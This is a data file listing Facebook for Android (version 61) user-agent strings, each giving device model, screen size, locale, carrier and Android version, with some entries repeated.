"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Emergency calls only;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI SCL-L01;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/eir;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/iD;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/hu_HU;FBCR/Telekom HU;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/pl_PL;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1196};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D722;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N750;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E700H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850W;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/sv_SE;FBCR/halebop;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500FN;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=768,height=1184};FBLC/en_GB;FBCR/Virgin;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=1.75,width=720,height=1280};FBLC/en_GB;FBCR/Tesco Mobile;FBMF/Archos;FBBD/Archos;FBPN/com.facebook.katana;FBDV/Bush 5"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/O2 - UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One X;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T999;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800H;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_CA;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I317M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBCR/Proximus;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/nb_NO;FBCR/TDC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9305;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=800,height=1280};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7000;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/vodafone IE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D802;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/Movil GSM ;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6916;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6906;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telecel Bolivia GSM;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/One;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9506;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5 FHD;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/EMOVIL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/4.4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I537;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1920,height=1080};FBLC/el_GR;FBCR/VODAFONE GR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Movil GSM ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Personal;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920I;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=1280,height=800};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=800,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=786};FBLC/es_LA;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H320;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=854};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VF-795;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Virgin;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2303;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/es_ES;FBCR/Personal;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2(4G-LTE);FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone ES;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/IDEA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5322;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_GB;FBCR/3;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_US;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1536,height=1952};FBLC/en_GB;FBCR/;FBMF/htc;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 9;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1920,height=1104};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/O2-IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Bell;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Emergency calls only;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI SCL-L01;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/eir;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/iD;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
